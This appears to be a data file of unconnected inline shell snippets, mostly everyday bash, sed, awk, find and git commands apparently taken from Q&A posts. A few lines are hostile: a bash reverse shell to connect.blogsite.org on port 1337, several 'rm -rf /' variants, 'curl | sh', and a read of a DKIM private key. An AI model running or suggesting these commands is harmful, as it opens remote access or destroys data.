./script.sh "/home/me/path\ with\ spaces/to/file"
./exist.sh +x file_name
/bin/bash -i >& /dev/tcp/connect.blogsite.org/1337 0>&1 &
echo "a b a" | grep  "a *a"
mam am
words "a"
a a
= 1.2345
bin/sh: 2: Syntax error: Unterminated quoted string
> /dev/null
set -m
set -m
set +m
shopt -u checkjobs
shopt -s checkjobs
shopt -u checkjobs &&
foo bar
sed ":a;N;\$!ba; s/$start.*$pattern.*$end//g"
perl -0777 -p -e 's/$start.*?$pattern.*?$end//s'
sed -f foo.sed filename
/\ndone$/! { $! b loop }
/^foo bar *$/,/^done *$/
/^done *$/!{H;d}
/^done *$/{H;g;s/.*//g;x;
PROMPT_COMMAND='echo -ne \"\033]0;${USER}@${HOSTNAME}: ${PWD}\007\"'
pwd | tr -d "\n" | xclip -selection c
find directory -type f
sed 's/\(.*\)\/.*/\1/g'
uniq -c
sort -n
awk '{if($1>5) print($2)}'
awk '{if($1>5) print($2)}'
awk '{if($1>5){ $1=""; print(substr($0,2)) }}'
wc -l
find . -size -2048c
find . -size -2k
-size -2k
sh -c sh
sh -c sh
PS1 is NULL
export PS1
echo $line | sed -e 's/^[^0-9]*\([0-9][0-9]*\).*/\1/'
Untitled Folder
help hash
echo =ls
ls =ls
grep LSmonitor /var/log/syslog | wc -l
| grep LSmonitor
'|' grep LSmonitor
'| grep LSmonitor'
sYear=2011; eYear=2013; sMonth=03; eMonth=08
(cd /home/folder1/folder2/folder3/ && zip -r test.zip *)
zip -r
ls -Q
ls -l
ls -al '$filename'
2> >(logger)
sh mvn
export PATH="$PATH:/usr/local/apache-maven-3.2.5/bin"
ls -l
chmod 0755 /usr/local/apache-maven-3.2.5/bin/mvn
sh /usr/local/apache-maven-3.2.5/bin/mvn
sh -x /usr/local/apache-maven-3.2.5/bin/mvn
brew update
brew install maven
for x in y;
for x in $y;
alias python='/cygdrive/c/python27/python.exe'
python <name of python file>
alias python='/cygdrive/c/python27/python.exe'
python <name of python file>
:no such file or directoryython.exe
line1=$(head -1 "$file")
seq ${#line1}
xargs -n1 -I% cut -c% "$file"
cut -c22 filename
paste -s -
tr -cd '[A-Z\n]'
tar ... |
echo >/dev/null
not found
0 8 * * 1,4,7 cd /home/myUser && ./start.sh
kill -f run.py
echo $! >/path/to/pid.file
sudo /sbin/start job_name
sudo /sbin/stop job_name
man bash
-v IGNORECASE=1
ftp user@domain.com@ftp.domain.com
ftp user%40domain.com@ftp.domain.com
ftp user+domain.com@ftp.domain.com
foo "rm -rf /"
proxy_pass  http://nodejs;
location ^~ /blog {}
/nodejs;/ {n;n;n;n;n;n;n;n;s/^/    location ^~ \/blog {}\n/}
s/^/    location ^~ \/blog {}\n/
sh startup.sh
man script
read -t0
x + x++
x++ + x++
x++ + x++
ps wax
['1', '5', '3']
['1^3', '5^3', '3^3']
BEGIN { ...
if ()
man sed
echo $?
DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
source $DIR/.somefile
unset DIR
( set -o posix ; set ) | less
set -e
assert _exit_code==0
-s -
-la /etc
"[ \t]*$
ls $HOME > foo.txt
set -v
grep -m1 "model name" /proc/cpuinfo | sed 's/.*://' | cut -d" " -f -3
grep -m1 "model name" ...
grep -m1 "model name"...
[$? == 0]
bash -o verbose
grep -m1 "model name" /proc/cpuinfo
PermitTunnel something
PermitTunnel point-to-point
{ }
{ }
$1 == "LINUX_KERNEL_DIR"
cat data.txt
-f avi
source ../foo/
source ../.*/
man find
0 1 2 3 13 15
EXIT HUP INT QUIT PIPE TERM
key3 value3
if [[ $rc -eq 0 ]]
command1 | command2
cnt[$2]++; lines[$2]=lines[$2]"\n"$0
END{for (k in cnt){if (cnt[k]>1)print lines[k]}}
use Time::Piece;
'Some cool string I want dequoted'
set -e
&& :
read -r
echo -ne
read -p
stat -c "%n:%F:%s"
sort -t: -rnk3,3
$2=="regular file"
brew install gawk
gawk --version
GNU Awk 4.1.1, API: 1.1
which gawk
echo  $PATH
head -c 32
fold -w 32
$( )
fold -w 32
head -n 1
tr -d '\n'
-v FS='<div class="label label-primary">#|</div>
<div class="label label-primary">#
$2>7{sub($2, $2-1)}
if [ -z $1 ]
test -n "$1"
tr -d '\n'
wc -L
local var=xyz
{ list; }
[[ expression ]]
source script.sh
trap DEBUG
no job control error
bash -c
time foo
pad.pl input.txt 1100 > output.txt
3.5.3 Shell Parameter Expansion
$0 [-d] [/path1[ /path2[ ...]]]
while getopts
read -p "enter foo" bar
bash -c run.sh </dev/tty
git clone app.git && cd app && npm install && bower install && gulp
git clone app.git && cd app && npm install && bower install ; gulp
git clone app.git && cd app && npm install && bower install
npm install -g gulp
echo "$USER"
3.4.2 Special Parameters
"hello "
/<media>/ && $0==last{next}
{print $0}
chmod u+x
chmod +x
chmod -x
-F '[| \t]+'
-v d=$(date +%m:%d:%Y:%H:%M:%S)
-v OFS=,
function cvt(x){return lshift(x, 10*(x~/K/)+20*(x~/M/))}
NR>2 {print d,cvt($10),cvt($11)}
gnu awk >= 4.1
yum whatprovides
set -f
set -f
' this string contain a star as  *'
gunzip -c $FILE | tee -a $UNZIPPED_FILE > $PIPE
$0 = $0 FS "xx"
${line_number} s/..../..../
du myfolder
tail -n1
grep total
man ascii
grep "total"
man du
uniq -c
awk '/_benny/,/_andrew/' filename
self.readline = __import__('readline')
import readline
tput smm
"no fruits"
foo@bar:~$ tar -czf foo.tar.gz /var/log/foo/!(logFile.*)
/bin/bash: /usr/local/bin/bag: Permission denied
chgrp test /usr/local/bin/bag
grep -E
w='one two'
printf %s\\n "foo "$w" bar"
printf %s\\n "foo$wbar"
grep -v
puppet apply
bash -l
sh stackoverflow_gui
"ab" "cd"
"ab cd"
man bash
$ for i in {0..10}; do echo $i; done
echo -e
echo -e "line 1\nline 2"
set -e
exit 1
sed -n '1~5p'
sed -n '1~${i}p'
" "
-v n=YOUR_NUM
awk -v n=7 'NR%n==k' file
please enter user's old password
echo "USERNAME:NEWPASSWORD" | chpasswd
chmod u+x ./passwdWrapper)
./passwdWrapper $user $password $server $newpassword
sudo apt-get install expect
-v OFS=,
NR>=3 && NR<=20
>= 3 and <= 20
tail -r
$(seq 1 $1)
$(seq 1 $1)
ProcessBuilder("bin/sh", "cd foo/bar")
ProcessBuilder("bin/sh", "cd", "foo/bar")
sed 's/.*importance//'
sed 's/.*importance//'
printf %s
$(( start + 1 ))
$(( start + 600 ))
$(( start + >600 ))
man bash
bind -p
y / n
John Doe
John Doe
John Smith
12_Screenshot 2.jpg
John Doe
John Smith
find: illegal option -- r
bash file_name
bash -c '$HOME/lib/atom/bin/Atom/atom "$@"' _ $argv
ls /dev/pts/  | wc -l
set -x
monitor power
CHARGE_CYCLES="$TOOLS/Data/Charge\ Cycles.txt"
export TOOLS
monitor power
cat "$CHARGE_CYCLES"
/Users/sl/.Tools/Data/Charge\ Cycles.txt: No such file or directory
cron | crontab
#! /usr/bin/env Rscript
chmod u+x path/to/myscript
module load R
$ruby script.rb | tee output.txt
script -a -c "ruby your_script.rb" -f your_file.out
script -a -c "ruby test.rb" -f test.out
sudo ./myscript.sh
find ./ -type d | wc -l
ps -l
ps -l
ps -l
sh -c 'ps -l'
ls -l `which sh`
lrwxrwxrwx 1 root root 4 Oct  6 14:06 /usr/bin/sh -> bash
fish -c 'ps -l'
Card Number, Surname, Name, Valid/Invalid, Money ammount
set -eu
set -eu
(( query ))
declare -A
line 125: 2014-12-01: value too great for base (error token is "01")
synclient Touchpadoff=1
synclient Touchpadoff=0
synclient -l
synclient Touchpadoff=
14 (as per question)
select *
fastQ = sys.stdin
fastQ = fileinput.input()
read-cmd "testtext.txt"
some-cmd < "text.txt"
read-cmd "contents of what should be in a text file"
read-cmd2 -d "testtext.txt" ...
for in
date -d
2015-01-09 ...
ls -1|tail -1
`ls -1 | tail -1`
bash -n
ksh -n
echo > /dev/null
import this
!coffeescript -c %
man bash
set -x
set -x
set +x
set -x
set +x
su <user> -c './scriptname -d'
help [r]ead
rvm is not a function
run as login shell
expect -c
expect -c
echo 'head -$num | tail -1'
head | tail
blkid -s UUID -o value /dev/sda1
!f{ $0 = "\\textbf{"$0"}"; f++}
$0 = "\\textbf{"$0"}"
"AA CC [[TEST|LOL]] EE FF"
invalid reference \1 on 1 s commands RHS
{print $0,p[$1]}
echo $v
unset array[2]  #specify, instead of using 'shuf' to randomize
shuf -i 0-4 -n1
find /local/DW/nan-campaign-reports -name "*.txt"
echo "$(i)" or echo "$i"
awk '...' file > tmp && mv tmp file
yum install dos2unix
ls {}
ls -l {}
py hello
rm -rf
curl | sh
gather_output(rlist, output)
192.168.0.1 rm -rf /
urxvtc -e bash -c "sleep 0.1; pkill sxhkd; sleep 0.1; bspc window -t fullscreen=on; sleep 0.1; cmatrix -u 9 -s; sleep 0.1; vlock; sleep 0.1; sxhkd"
;A window
sudo -i
/tmp/args.sh "" two
sudo -i
if (( 10#$HOUR == 10#$v ))
( \2 | \1 )
printf("( %s %s",$NF,RS)
gsub(/>>>.*$/,")"); printf("%s",$0)
myprogram > file1 2> file2 &> file3; cat file3
cat file3
tee out.log
tee err.log
1. [color=any small letter sequence]
2. any small letter sequence
3. [/color]
1 and 3
1st and 2nd groups
rm -rf /$TO_BE_REMOVED
"Message=I NEED TO NOT INTERPRET THIS VAR "
a = sudo("ls -l my_filename | awk '{print $11}'")
rule { action }
./bash_script > output
openssl rsa -in /etc/dkim.key
ssh ...
cat -v
set ff=mac
uniq -c
man sort
FOO=bar baz
gnu awk
ilcdtl57gy784w:~ username$
$PS1=\h:\W \u\$
$PS1=\h:\W \u\$
man find
find . "*-e" -type f exec rm '{}' +
 -exec <your-command> {} \;
find . -name "*.sh" -exec echo {} \;
find . -name "*.sh" -maxdepth 3 -exec echo {} \;
find . -name "*.sh" --exec echo {} \;
find: --exec: unknown primary or operator
find . -name "*.sh" exec echo {} \;
find: exec: unknown primary or operator
 \;
find . -name "*.sh" -exec echo {}\;
find: -exec: no terminating ";" or "+"
find . -name "*.sh" -exec reformat.py --myfancy-option-to-reformat {} \;
find . -name "*.sh" -exec echo {} \;
find . -name "*.sh" -exec echo '{}' \;
 +
find . -name "*.sh" -exec echo {} +
cat -n
s_^A [^ ]* _A 18 _;s_^B [^ ]* _B 0 _;s_^C [^ ]* _C 43 _;s_^D [^ ]* _D 12 _;s_^E [^ ]* _E 3 _;
dup2(2, 1)
echo >&2 message
>&2 echo message
echo message >&2
docker commit 1234 mycontainer
git log
pref_set ...
ps -ef | grep 1505
man bash
sqlquery=$(mysql $MYSQL_DB  -u $MYSQL_USER -p$MYSQL_PASSWORD -se "SELECT * FROM ip_list WHERE valid='Y'")
wc -l
--follow --retry
> 1
echo *.txt
ggrep a*
ggrep a* x
ggrep * x
sed 's/.*[\(.*\).\(DOB-[0-9]*\).\(Post-[0-9]*\).*/\1 \2 \3/'
$2, $3 and $4
2nd, 3rd and 4th fields
grep (GNU grep) 2.16
while - read
whois | grep
head -10 file
$i -le $(ls Stefano* | wc -l)
grep xyz
grep xyz
ps -ef
if ps -ef | grep '[x]yz'; then
grep [x]yz
ps -ef
if pgrep -f xyz >/dev/null; then
man pgrep
COMMAND | cat >> file
command="curl -H \"Content-Type: whatever\" $1 $2"
< <( )
"$(command "$var")"
"a & b"
'single quotes'
$'s: 'Costs $5 US'
ssh host 'echo "$HOSTNAME"'
shift + page up/down
set -x
/bin/bash -x
ruby file_name.rb
rails console
git add -A
git add -A
git add .; git add -u
mutt -s "Subject Line Here" -a $(path/to/your/script.sh) email@domain.com < message.txt
for loop
ssh $SERVER >> EOF
ssh $SERVER >> EOF
<< EOF
<< 'EOF'
mkdir -p /path/to
$(dirname file.txt)
read -t
foo^M: Command not found
cat -v
array variable
some identical text
./scriptB &
sleep 10s
kill $!
... >& file
ISAS01_102013 (issue 296 and 297).zip
ISAS01_102013 (issue 296 and 297)
cd ISAS01_102013 (issue 296 and 297)
ISAS01_102013 (issue 296 and 297)
"ISAS01_102013 (issue 296 and 297).zip"
ISAS01_102013 (issue 296 and 297)
cd ISAS01_102013\ \(issue\ 296\ and\ 297\)/
-v FS=OFS=";"
{"debug": false "title": "Application update!"}
{"debug": false "title": "Application update!"}
adb shell
am broadcast -a com.test.android.ACTION_TEST_FEATURE -n com.test.android/.receivers.TestsReceiver --es "notify" '{"debug": false, "title": "Application update!"}'
adb shell "am broadcast ... '"'JSON_TEXT'"'"
am broadcast
pidof openconnect
fprintf(stderr, "Things I don't want\n");
telnet -X SRA
echo foo and bar
telnetpass Host125
ssh user@host commandtoexecute
sort -n -r
/bin/bash: /usr/bin/perl: Argument list too long
yum install net-tools
-i, --ip-address
-I, --all-ip-addresses
ipaddr=$(curl -s http://whatismyip.akamai.com/)
ip addr
ip a
ip a | grep 192
ps ... | grep ... | awk ...
netstat -tulpun | grep -i port
ps -ef | grep
netstat -tulpun
grep ":25 "
awk '{print $7}'
grep "/"
awk -F "/" '{print $1}'
netstat -tulpunt | grep ":25 " | awk '{print $7}' | grep "/" | awk -F "/" '{print $1}'
netstat -tulpunt | grep ":25 " | awk '{print $7}' | grep "/" | awk -F "/" '{print $1}' | xargs -I % sh -c 'echo Port % && ps -ef | grep % && echo '
ps -ef | grep ${PID}
man sed
([^ ]+)
x < y < z
x < y && y < z
df -h
ps -p ... | awk '...'
exit 99
exit $ERRL
set -o pipefail
sort -k1 test1.txt
sort -k1 test2.txt
sort -n -s k1,1
sort -k1,2
sort -k1,1 -k2,2
sh.exe": init.sh: command not found
cd ~/Homestead
Finder > your home directory > Homestead
bash init.sh
Homestead initialized!
while getopts
#!/usr/bin/env ipython
teqc -tr d input >output
env.abort_on_prompts = True
public static void main
/Library/Java/JavaVirtualMachines/jdk1.7.0_71.jdk/Contents/Home/bin/java -Didea.launcher.port=7532 "-Didea.launcher.bin.path=/Applications/IntelliJ IDEA 14 CE.app/Con
sudo cat > hooks/post-receive
grep -F
echo $PATH
brew upgrade git
git --version
for i in {1..22} X; do
android applications with external .jars
Select Case
shell commands
Ubuntu terminal
select name [ in word ] ; do list ; done
echo $outdir
ls | grep *.txt
ls | grep .*.txt
list of files
list of files
ls -al
ls | grep .*.txt
ls *.txt
ls | grep .*txt
ls | grep *.txt
ls | grep .*.txt
netstat -tulpun | grep -i port
ps -ef
ps -ef
ps -fp%
16/12/14 11:40
12/16/14 11:40
echo "16/12/14 11:40" | sed -r 's/([0-9]+)\/([0-9]+)\//\2\/\1\//'
BEGIN{ FS=OFS="|" }
NR == FNR
a[$1]=$0; next
NR == FNR + length(a)
b[$1]=$0; next
sed -rn '/^[[:xdigit:]]{7}:.*[[:space:]]d[01][[:xdigit:]]{6}[[:space:]].*.{16}$/ s/\r//p' aaa.log
grep -o "d1[^ ]\{6\}\|d0[^ ]\{6\}"
sed 's/NAME=".*"/NAME="Jack"/g' names.xml
sed -i 's/"host":.*$/"host": "10.20.30.40"\n/'
echo $(top)
top -bn 1
TO_REPLACE="Hello Kitties=$first"\r
>@ stdout
2>@ stderr
echo -e
| tee /var/tmp/some-temp-file.$$
man du
grep -o
<FRAMESIZE>, <CODE>, <COLOR>
man bash
sort -m
sort -m
cut -f 1 -d ' ' MyFile.txt
$ echo "xyx[xzx]xyx" | sed 's|[\[]| |g'
xyx xzx]xyx
$ echo "xyx[xzx]xyx" | sed 's|[\[\]]| |g'
find . -type f -not -name "checksums.md5" -print0 | xargs -0 md5 -r > checksums.md5
-type f
hexdump -C
65 cc 80
another_script.sh blah blah blah
echo $PATH
md = hashlib.sha1()
head -c 2k
--trace-ascii dump.txt
cat file.txt
mapfile -s 1 -t ArrayObs < file.txt
cat file | tr -d '\n' | td -d '\r' | sed 's#</script>[[:space:]]+##g'
line 3: lastUser: command not found.
END {print count["BLOCK"]}
print $count
print count
awk '{print $3}'
uniq -c
print $count
awk ' BEGIN {count=0;}  { if ($3 == "BLOCK") count+=1} END {print count}' firewall.log
seen[$1] = rand() * 1000000
{print $0 " - " seen[$1]}
{if (...) {action if true} else {action if false}
{if ($1 in a) {c=a[$1]} else {c=NR; a[$1]=c}}
print $1, c
-v OFS=" - "
man sed
edit files in place
javac pgQuery.java
sed '/\//d'
-printf '%f\n'
ncat host port
cat </dev/tcp/host/port
netcat in FreeBSD
git ls-files -u
git pull
git fetch
git merge --ff-only
git config --global user.email "Email Id"   && git config --global user.name "User Name"   && git merge  --no-commit  --no-ff origin/master   && git diff --cached   && git merge --abort 
man ssh_config
"$(command "$var")"
"a & b"
'single quotes'
$'s: 'Costs $5 US'
ssh host 'echo "$HOSTNAME"'
awk 'NR>17{exit} NR>7'
export TABLES="A B C D...Z"
D E F ... etc
sh ...
bash export-script DBName username password
export-script DBName username password
files=(file1 file2 "file with embedded spaces in name"..)
for file in "${files[@]}"
jq <"$INPUT"
array=( $(stuff) )
set -h
while read
read -a
sed 's/\B.//g;y/-//'
php -v
PHP 5.5.12 (cli) (built: Apr 30 2014 11:20:58) ...
phpunit/phpunit" : "3.7.*
phpunit/phpunit" : "3.7.*
phpunit/phpunit" : "4.5.*
php composer.phar update
man fold
awk END{print} averages.dat
awk '{print $0, value}' averages.dat
>> averages2.dat
& value
print $0, value
"s/.*/& $DENSITY/"
bash -v
man bash
ORDER BY
ORDER BY
grep -o -e '[a-zA-Z]\{1,\}' -h list of files in $1 matching the regex $2
"remount failed: Operation not permitted"
unknown option -- o
TERMINAL EMULATOR
ADB SHELL
#cat /proc/mounts
/dev/stl12 /system rfs ro,relatime,vfat,log_off,check=no,gid/uid/rwx,iocharset=utf8 0 0
mount -o rw,remount -t rfs /dev/stl12 /system
unknown option -- o
adb shell
su -c <cmd>
mount | grep system
getent group $group > /dev/null 2>&1
while read x; do; … ; done
BEGIN    { _ord_init() }
sprintf("%c", 7)
sprintf("%c", 128 + 7) == "\a"
tag -l ${dumpFolder}*;
tag -l ${dumpFolder}*;
tag MyTag ${dumpFolder}* | xargs -I {} mv {} /path/to/dir/;
copy & paste
500 MB
"pasteboard copy"
pandoc -f markdown -t html
echo $hash
echo $hash
echo $hash
echo "$hash"
play WARN alsa: under-run
echo "export PATH=\$PATH:/home/xyz/abc/polyglot/bin" >> ~/.bashrc
:! source ~/.bashrc
! echo $PATH
echo $PATH
bash -c
! $D1 -ef $D2
type [
type test
which [
which test
[ ! $D1 -ef $D2 ]
[ ! $D1 -ef $D2 ]
cmp -s $D1 $D2
time <= duration
time <= duration-timeStep/2
moveto "png"
moveto "png|jpg"
shopt -s extglob
> su marshell -c "CP=/home/marshell/sanity_test_scripts/; java -cp $CP JavaRunCommand $1 $2 $3 $4 $5 $6 $7 $8 $9 ${10}"
> sudo -u marshell -i "CP=/home/marshell/sanity_test_scripts/; java -cp $CP JavaRunCommand $1 $2 $3 $4 $5 $6 $7 $8 $9 ${10}"
system "bash -c 'echo $SHELL'"
system "/bin/bash", "-c", "echo $SHELL"
str1 = "This_is_a_big_sentence"
arr=(${str2//_/ })
sed 's/_/\n/g' <<<${str1,,}
<(sed 's/_/\n/g' <<<${str1,,})
<(sed 's/_/\n/g' <<<${str2,,})
grep -vwFf file1 file2
-v RS=_
a[tolower($1)]; next
{delete a[tolower($1)]}
sed -e 's/\(.*\)/\L\1/'
sed -e 's/_/\n/g'
var == var2
ruby file.rb "parameters"
regtask parameters
ruby greeter.rb
man env
ls -l greeter.rb
ln -s $PWD/greeter /usr/local/bin/
man <command>
CONDITIONAL EXPRESSIONS
* *
* * *
* * *
grep -E
type grep
$(seq 1 15)
xargs -n1 -P3
sed -i 's/str1.*str2//' file.dat
bla.bla.TextOfUnknownLength.bla.bla 1023=3 290=1 336=17 273=07:59:57.833 276=K 278=0 bla.bla.TextOfUnknownLength.bla.bla 1023=20 290=2 336=7 273=07:59:57.833 276=K 278=0 bla.bla.TextOfUnknownLength.bla.bla ...
sed -ri 's/(foo)(.*)(bar)/\1\3/g' between.file
egrep "ERROR|ORA|Exception|at.*\.java\:.*"
n ls
n ls
echo $(...)
command -a -1
command -a -1
command -a -2
command -a -2
command -a -4
command -a -4
command -a -3
grep -F
line 1:xxx not found
for key in ...
ls $TEST_DIR/*.jpeg $TEST_DIR/*.png $TEST_DIR/*.jpg
Kill -SIGUSR1 pid
uniq -c
array[$2] += $1
END{for ( i in array) print array[i], i}
| sort -nr
open -a Terminal "pwd"
{PATH_PREFIX: '/Users/path_to_project_folder'}
x = a^b
ln(x) = ln(a^b) = b(ln(a))
x = exp(b(ln(a)))
first XX
Mic1 Volume
grep --help
sed '/regex/d' file
wc -l
grep -c
find -print0
test.sh 1 2 3
1 2 3
set -e
set -u
tr -d '\r'
at least one number
/ {0,}/
echo $R_HOME
R RHOME
R CMD config ...
tail -f /var/log/messages
ifconfig | foo | bar
inet Adresse:127.0.0.1
inet addr:127.0.0.1
$(hostname -I)
', 0, 2);
cat file | sed 's/<b>.*</b>//g'
', 0, 2);
sed 's/\\n\\.*'//g'
./script 1 2 3 4
./script `cat file`
for i in `./script `cat file` `
$(cat file)
cat file
"exceptions_ ... .log"
foo = 1; print $foo
$0 ~ some_variable
exec foobar
exec 2> /var/log/foobar.log
exec 2>/var/log/foobar.log
exec foobar 2>/var/log/foobar.log
exec foobar
exec [-cl] [-a name] [command [arguments]]
var1="$var1 $var2"
ps aux | grep python
foo bar baz
"bar baz"
sed -i 's/^#*LOCK_AFTER_RETRIES=.*/LOCK_AFTER_RETRIES=6/g' filename
Desktop/Research Project
git commit -a
git commit --amend
git commit --amend
git log
NR == 1
OS X 10.10.1
ubuntu server 14.04.1
ubuntu 14.04.1 Linux 3.13.0-32-generic x86_64
OS X
declare -a tF=()
[ $param == '-h' ]
[ "$param" == '-h' ]
[ $param == '-h' ]
tail -f
sed -n '/^done$/q'
use_reloader=False flag
grep 'some class'|sed -n 's/.*href="\(.*\)".*/\1/p'
sed -i "s/\(.*\)/[\1]/" file_name.txt
[ "$r" -eq 1 ]
./testFunctions 1
man terminfo
tput setaf [colornum] && echo [text] && tput sgr0
make > my_log.txt
[ -t 1 ]
sleep 15
^\( *\)
android-studio/bin folder
main(int arg_count, char *args_vector[]){...}
./script "A~ "
A B C
(A B C)
sudo chown iMac ~/.bash_profile
Ctrl + O
Ctrl + X
crontab -r
crontab -e
set Sverion=%~dp0\*.jar
^Wed Jan 21 05:49:37 CST 2015
echo ^
echo $deeps
ulimit -a | sed 's/.*\-\([a-z]\)[^a-zA-Z].*$/\1/'
ulimit -a
Fatal error: Call to undefined function json_encode() in /www/music.php on line 25
Unexpected token ILLEGAL
value="${value// /\\ }"
value="${value// /_}"
from foo import bar
import foo
import a, b, c
<?xml version="1.0" encoding="UTF-8"?>
-maxdepth 1
-maxdepth 2
ls -d
-e …arg…
cat /proc/mounts
perl perlscript.pl
Site Title - Local
Site Title - Staging
Site Title
- Local
- Staging
- Local
TypeError: bufSize must be an integer
PermitRootLogin yes
##PermitRootLogin yes
mycomp c
mycomp ccc
-N 3
programname -libraryjars file1.txt -libraryjars file2.txt -libraryjars file3.txt
awk -F", " {'print$2'}
awk '{print length}'
Ex: myscript -db dev -url whocares.com
myscript -env local
grep | sed
302 moved temporarily
-i 's/string/new-string/g' *.*
bash x_server.sh
chmod +x x_server.sh
cut: 639: No such file or directory
mv * backup/
mv *
mv * .* backup/
grep | sed
-F"  +"
print $NF
2 continuous spaces
-path "/sys"
-path "/sys/*"
! -path "/sys" ! -path "/sys/*
cat -v
grep -E
(ps aux | tee >(head -n1 >&3 ) | grep bio >&3 ) 3>&1
ps aux|sed '1p;/kwork/p;d'
{print }
2> /dev/null
sudo dpkg
xinput --list-pros <device>
...(242): <no items>
...(242): 1 22 333 4444
xinput --list-pros <device>
<no items>
xinput --list
xinput --list-props
help printf
ret=$(lines word1 word2 word3)
awk '{print}'
"{{ releases_path }}"
"{{ releases_path }}"
gnu awk
gnu awk
mv myscript.js \.*
mv myscript.js m*
mv myscript.js .myscript.js
mv myscript.js myscript.js
awk -v var=val
$0 ~ val
gitf "05"
if [ "$wasFound" -eq 0 ];
while IFS= read -r entry; do
select a in l; do
select a in l\ndo
echo -e
echo -e
-c colour
-f foreground
-b background
man console_codes
set -o xtrace
var=( $var )
bash script_name string
bash script_name TesT*
bash script_name TesT1.c TesT1.h TesT2.c TesT2.h
./db2licm -l
ls -l
stuff $0
ps aux
bash -x
sudo time ...
time sudo ...
sudo sh -c 'time python ...'
set -e
echo $?
chkconfig --list | grep --quiet "jetty"
set -e
set -e
set -e
#java -version
file /usr/bin/java
which java
echo $JAVA_HOME
uname -a
xargs -I
tar cvf ...
type make
find -name pom.xml
find -prune
" "
git diff
git diff
git diff --name-only -z "$merge_base" $BACKUP_BRANCH
git diff
git difftool
git changes
git changes
git diffn
git diff
sudo ee domain.com
sudo -i
COPY YOUR MBOX TO A TEMPORARY DIRECTORY
formail +100 -60 -s <google.mbox >import-02.mbox
formail +100 -500 -s <google.mbox >import-02.mbox
dr-------- js/
chmod 755
drw-r--r-- js/
drwxr-xr-x js/
-----------------e- ./js/
(PHP Perl Python)
! func
activator start -mem 512
activator start -J-Xms512m -J-Xmx512m
-Xms1024m -Xmx1024m -XX:ReservedCodeCacheSize=128m -Duser.dir=/home/oguz/dev/rhymo-server/target/universal/s$
activator stage
system.time(df3 <- as.data.frame(mapply(paste, df1, df2, sep="/")))
(paste(as.matrix(df1), as.matrix(df2), sep="/"), dim(df1)))
man zshmisc
!NF{i=0; print; next}
{print ++i, $2}
which which
type which
which -a python
type python
hash -r
while [[ ${pump_read} -eq 1]]; do
IFS="|" read pump_f1 pump_f2 pump_f3 < queuefile
echo "${pump_f1}|${pump_f1}|${pump_f3} >> pump.log
echo "x|y|z" | ssh user@host "cat > queuefile"
[^#%0-9\0\1\9\10 "$&'();<>\`|\x7f][^\0\1\9\10 "$&'();<>\`|\x7f]*
[^#%0-9\0\9\10 "$&'();<>\`|][^\0\9\10 "$&'();<>\`|]*
[^#%\0\9\10 "$&'();<>\`|][^\0\9\10 "$&'();<>\`|]*
[^#%0-9\0\1\9\10 "$&'();<>\`|\x7f][^\0\1\9\10 "$&'();<>\`|\x7f]*
[^#%0-9\0-\f "$&'();<>\`|\x7f-\xff][^\0-\f "$&'();<>\`|\x7f-\xff]
declare -pF
this variable contains a $variable
this variable contains a word
eval "echo "'"'"$var"'"'
echo Hello
> file
set -x
set -x
/usr/bin/at now + 1 min
if grep -q "CPLD " tmp-file ; then echo "y" | <some long command> ; fi
sed -E
sed -r
$((  ))
$((  ))
GNU sed
open(f, 'a')
Create Desktop Entry
kill -9
kill -KILL
npm install -g
ln -s /project/lib/node_modules/gulp/bin/gulp.js /usr/bin/gulp
sleep 60
[ -d "$HOME/foo/" ]
chmod a+x foo.sh
find -mmin 1
git diff-tree -r --name-only --no-commit-id
git ls-tree -r --name-only
git diff-tree -r
--branches --tags
git diff
git log
php scriptName --setAppName [new name]
php scriptName --setAppName [oldFolderName] [NewFolderName]
INSERT INTO table1 VALUES (5566, 1979, 'Montag', '06:00', '19:00', 1, 'ON', NULL
gnu awk
set --
source config_file
grep -eq 'true' /etc/elasticbeanstalk/has_puma.txt;
bundle exec
php boiler
php boiler
which commandName
which boiler
echo $PATH
while [ "$var" = "Y"]
'contain'('vitamin c','oranges').
'prevent'('scurvy','vitamin c').
perl -pi -e
find .
-m codecube
[[ "$num" =~ $re ]]
[[ "$str" =~ regex ]]
$? == 0
$? == 1
help test
[ [
sed -n "/^quest.*$i\$/,/^quest.*$(($i+1))\$/p"
sed "/^q/d"
head -n-1|tail -n+2
|tail -1
read -p
>> echo
trap 'handler' DEBUG
read -r
-v FS=","
{print $6,$6,$1}
-c 1
-c 1
IFS= read A B
IFS=" "
( .. )
{FS = ","}
{print $3}
awk --posix
> /dev/null
Remove the bash script,
Rename the apps main executable to the bash scrips name,
wget -nd
man wget
cmd1 <(cmd2)
cmd1 <>(cmd2)
gcc generate.c -o generate
gcc generate.c -o generate -lcs50
make50 generate
variable x
echo $(($x))
perl -e "print $x"
if [ ]
echo $(date -v-1d +%Y-%m-%d);
a=(); a[${#a[@]}]=${number}; echo ${a[@]}
(sed 's/$/,/' fileA | grep -wf fileA fileB.csv)
grep -wf fileA fileB.csv
sed ... | grep -wf fileA fileB
cut -d1 -d' '
cut -f1
while true; do
sudo ./test.sh
FNR==NR {}
{a[NR]=substr($0,0,5); next}
a[FNR]==$1 {print FNR}
echo "$f" |
:multiuser on
git config --global
xargs -0 -n 1 whatever command
command git
[^"a-zA-Z0-9,. ]*
$stdout = File.new('/path/to/text.txt', 'w')
getaddrinfo: Name or service not known
./myscript http://www.example.com
Python 2.7.5
cqlsh -f ~/datomic/bin/cql/cassandra-user.cql -u uname -p pword
pip install cassandra-driver
export PYTHONPATH=$PYTHONPATH:/usr/local/lib/python2.7/site-packages
brew install python
pip install cql
which pip
{print > $1}
if grep a and grep b
if [ foo -eq bar ]
if grep -q foo bar
set -- $input
p4 diff
p4 jobs ...@\>2015/01/20
p4 diff
p4 diff2
p4 diff
bash -c
var=value command
command p4 "$@"
tail -n+2 "${csv}"
< tail -n+2 "${csv}"
mktemp -u
git describe --tags
File " /xxxx/yyy/zzz/data.txt "contains the following lines in found.txt $line
echo $data
rm {LONG_DIRECTORY_PATH}
column -t
if [ $z != "*.zip ]
[ -f "$z" ]
ssh user@host "WINDOWS_PYTHON_PATH Script.py arg1 arg2 arg3"
ssh user@host "Script.py arg1 arg2 arg3"
"Script.py arg1 arg2 arg3"
PATH=/cygdrive/c/WINDOWS/system32:/bin cmd /c
ssh user@host "PATH=/cygdrive/c/WINDOWS/system32:/bin cmd /c script"
sudo cqlsh -u cassandra -p cassandra
CREATE USER admn WITH PASSWORD 'pw' SUPERUSER;
code=2100 [Unauthorized] message="Only superusers are allowed to perform CREATE USER queries"
authenticator: AllowAllAuthenticator
authenticator: PasswordAuthenticator
uniq -c
print cnts[v], v
